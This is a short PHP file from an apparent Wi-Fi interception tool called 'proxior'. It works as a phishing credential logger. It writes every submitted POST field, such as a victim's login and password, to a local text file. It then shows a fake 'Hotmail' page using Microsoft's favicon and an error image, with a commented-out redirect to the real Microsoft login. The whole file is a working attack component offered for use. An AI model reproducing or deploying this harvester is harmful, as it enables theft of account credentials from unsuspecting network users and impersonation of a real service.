<?php 

/*
*  Copyright (c) 2019-2020 Barchampas Gerasimos <makindosxx@gmail.com>.
*  proxior is a wifi interception.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

$file = "export/data.txt";
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);

?>

<!-- <meta http-equiv="refresh" content="0; url=https://login.live.com"/> -->

<html>
<head>

<title> Hotmail </title>

<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27593.7/images/favicon.ico"/>

</head>
<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
</body>
</html>
